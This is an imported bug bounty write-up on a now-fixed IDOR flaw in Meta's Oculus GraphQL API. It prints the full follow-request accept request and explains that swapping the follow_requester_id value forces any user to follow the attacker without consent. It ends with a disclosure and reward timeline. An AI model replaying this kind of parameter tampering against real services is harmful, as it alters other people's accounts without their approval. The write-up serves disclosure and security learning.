---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-09_meta-quest-attacker-could-make-any-oculus-user-to-follow-subscribe-him-without-a.md
original_filename: 2023-01-09_meta-quest-attacker-could-make-any-oculus-user-to-follow-subscribe-him-without-a.md
title: 'Meta Quest: Attacker could make any Oculus user to follow (subscribe) him
  without any approval'
category: documents
detected_topics:
- idor
- access-control
- command-injection
- otp
- graphql
- cors
tags:
- imported
- documents
- idor
- access-control
- command-injection
- otp
- graphql
- cors
language: en
raw_sha256: 4f688976ce4195cf8b7a910a9e0cb1330b18212ac8d524489822f1f413bd5bd3
text_sha256: 5439a9f8cbf2edb0e16ab33ea0bf32ed25bd969a8a6e0ef8c3576bf56460f0fa
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: true
---

# Meta Quest: Attacker could make any Oculus user to follow (subscribe) him without any approval

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-09_meta-quest-attacker-could-make-any-oculus-user-to-follow-subscribe-him-without-a.md
- Source Type: markdown
- Detected Topics: idor, access-control, command-injection, otp, graphql, cors
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: True
- Raw SHA256: `4f688976ce4195cf8b7a910a9e0cb1330b18212ac8d524489822f1f413bd5bd3`
- Text SHA256: `5439a9f8cbf2edb0e16ab33ea0bf32ed25bd969a8a6e0ef8c3576bf56460f0fa`


## Content

---
title: "Meta Quest: Attacker could make any Oculus user to follow (subscribe) him without any approval"
url: "https://www.vulnano.com/2023/01/meta-quest-attacker-could-make-any.html"
final_url: "https://www.vulnano.com/2023/01/meta-quest-attacker-could-make-any.html"
authors: ["Dzmitry Lukyanenka (@vulnano)"]
programs: ["Meta / Facebook"]
bugs: ["IDOR", "Broken authorization"]
bounty: "1,726"
publication_date: "2023-01-09"
added_date: "2023-01-11"
source: "pentester.land/writeups.json"
original_index: 1690
---

###  Meta Quest: Attacker could make any Oculus user to follow (subscribe) him without any approval 

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps

By  [ Dzmitry ](https://draft.blogger.com/profile/06784930502399670573 "author profile") \-  [ January 09, 2023  ](https://www.vulnano.com/2023/01/meta-quest-attacker-could-make-any.html "permanent link")

## Description

Attacker was able to subscribe any Oculus user on attacker's Oculus account without user approval. So it was possible to make very attractive account with a lot of real followers without their approval:). This followers are displayed in Oculus Quest device when you open user profile, also in profile opened in Meta Quest for Android and some other places.

## Bug details

This page <https://secure.oculus.com/my/people/> displays Oculus user followers:

[![](https://blogger.googleusercontent.com/img/a/AVvXsEi-fursUO-H5C2Z9yI7A3RISIadhRSc3DtGMEHG9UHVLhkneRRxIognMxOBJcVPTIzYvJZ7N-xSP1q28aPFMMIyiKheq0F2s6woptpYsAtv4ELiTuyB0_dFbw6bqa6wBiiAJKjD5KBWaoHNLY2JN0s0183ZiaCFWQ6x0BHfpPq9O-7VYfxxovxgjnZjDA=w640-h310)](https://blogger.googleusercontent.com/img/a/AVvXsEi-fursUO-H5C2Z9yI7A3RISIadhRSc3DtGMEHG9UHVLhkneRRxIognMxOBJcVPTIzYvJZ7N-xSP1q28aPFMMIyiKheq0F2s6woptpYsAtv4ELiTuyB0_dFbw6bqa6wBiiAJKjD5KBWaoHNLY2JN0s0183ZiaCFWQ6x0BHfpPq9O-7VYfxxovxgjnZjDA)

  

If user (attacker) has enabled confirmation for follow requests, than everytime when somebody wants to follow him, user should confirm this action (see screenshot).

When user press "confirm" the next request is executed:

> POST /graphql?locale=en_US HTTP/2  

> Host: graph.oculus.com  
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0  

> Accept: */*  
Accept-Language: en-US,en;q=0.5  

> Accept-Encoding: gzip, deflate  
Referer: https://secure.oculus.com/  

> Content-Type: application/x-www-form-urlencoded  
X-Fb-Friendly-Name: OCA***REDACTED-SUSPECT-TOKEN***> Content-Length: 1149  
Origin: https://secure.oculus.com  

> Dnt: 1  
Sec-Fetch-Dest: empty  

> Sec-Fetch-Mode: cors  
Sec-Fetch-Site: same-site  

> Te: trailers

access_token=[oculus_token]&__user=0&__a=1&__dyn=7xxxxxxx&__csr=&__req=b&__hs=19319.BP%3ADEFAULT.2.0.0.0.0&dpr=1&__ccg=UNKNOWN&__rev=1006635818&__s=0r9wew%3Ahv568o%3A8ypvmx&__hsi=7169288311854648182&__comet_req=0&fb_dtsg=NAcPG2AAd4G6m4szOMQvjzA16I2JKXs2PpV0Zpo9_y87xy-YjAtUBXQ%3A25%3A1669198279&jazoest=25286&lsd=9-B9N5_yEmkNxprj42tPAh&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=OCAccountFollowRequestButtonsAcceptMutation&variables=%7B%22follow_requester_id%22%3A%22109035146728215%22%2C%22add_connections%22%3A%5B%22client%3A10487732912XXXX%3A__OCAccountFollowerList_followers_connection(orderby%3A%5C%22NAME_OR_ALIAS%5C%22)%22%5D%2C%22remove_connections%22%3A%5B%22client%3A10487732912XXXX%3A__OCAccountFollowRequestList_follower_requests_received_connection(orderby%3A%5C%22NAME_OR_ALIAS%5C%22)%22%5D%7D&server_timestamps=true&doc_id=5253592544678660

>  

Where "follow_requester_id%22%3A%22109035146728YYY" represents parameter with Oculus ID who wants to follow user (your account). Now replace "109035146728YYY" on any other valid "XXXXX" Oculus ID and execute this request.

User "XXXXX" will be subscribed on your account (will follow you without any approvals from "XXXXX" side).

## Timeline

23.11.2022: me: bug submited like issue found in People for Oculus Quest device app (I did't knew http request for this, but it worked via People app bug)

23.11.2022: me: found vulnerable request via <https://secure.oculus.com/my/people/> page and have submited more details

24.11.2022: fb: triaged

26.11.2022: fb: reward $863 (750 + 113 bonus)

26.11.2022: me: asked to explain reward amount 

30.11.2022: me: payment dispute

07.12.2022: fb: fixed

14.12.2022: fb: additional reward $863 (750 + 113 bonus) - total reward $1500 + $226 bonus

however I expected that this issue will have more impact than it was rewarded:), but ok.

  * Get link
  * Facebook
  * X
  * Pinterest
  * Email
  * Other Apps
